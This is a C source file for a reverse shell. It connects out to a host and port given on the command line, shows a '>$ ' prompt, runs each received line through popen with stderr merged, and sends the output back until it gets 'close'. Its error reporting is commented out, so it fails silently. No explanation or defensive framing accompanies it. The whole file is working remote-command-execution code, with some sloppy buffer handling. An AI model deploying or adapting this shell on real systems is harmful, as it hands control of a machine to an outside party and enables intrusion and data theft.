#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#define ERROR -1
#define MAX 4096

void *get_in(struct sockaddr* sa)
{
	if (sa->sa_family == AF_INET)
		return &(((struct sockaddr_in*)sa)->sin_addr);

	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

// Function for unix machines
int handleTcp(char *addr, char *port)
{
	FILE *fp;
	struct addrinfo serv, *servinfo, *p;
	int status, msgbytes, sock;
	char buf[MAX];
	char wrt[MAX];
	char *hlo	= "Hello\n\n\0"; // Connection header
	char *cls	= "close\0";	 // Close signal
	char *head	= ">$ ";	 // Terminal header
	char *tail	= " 2>&1"; 	 // Fowards stderr to stdout

	memset(&serv, 0, sizeof serv);
	serv.ai_family		= AF_UNSPEC;
	serv.ai_socktype	= SOCK_STREAM;
	
	status = getaddrinfo(addr, port, &serv, &servinfo);
	// for debugging
	/*if (status != 0)
	{
		fprintf(stderr, "getaddrinfo %s", gai_strerror(status));
		exit(ERROR);
	}*/

	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
		if (sock == ERROR)
		{
			//perror("socket");
			continue;
		}
		status = connect(sock, p->ai_addr, p->ai_addrlen);
		if (status == ERROR)
		{
			close(sock);
			//perror("connect");
			continue;
		}
		break;
	}

	if (p == NULL)
	{
		//fprintf(stderr, "socket failed to bind");
		exit(ERROR);
	}

	freeaddrinfo(servinfo);

	while (strcmp(buf, cls) != 0)
	{
		send(sock, hlo, strlen(hlo), 0);

		msgbytes = 1;
		while (msgbytes)
		{
			send(sock, head, strlen(head), 0);
			msgbytes = recv(sock, buf, MAX, 0);
			
			buf[msgbytes-1] = '\0';
			if (strcmp(buf, cls) == 0)
			{
				send(sock, "good bye\n\0", 10, 0);
				break;
			}

			if (msgbytes)
			{
				fp = popen(strcat(buf, tail), "r");
				while (fgets(wrt, MAX, fp) != NULL)
					send(sock, wrt, strlen(wrt), 0);
				pclose(fp);
			}
		}
	}
	close(sock);

	return 0;
}




int main(int argc, char **argv)
{
	char *addr 	= argv[1];
	char *port 	= argv[2];
	
	handleTcp(addr, port);

	return 0;
}


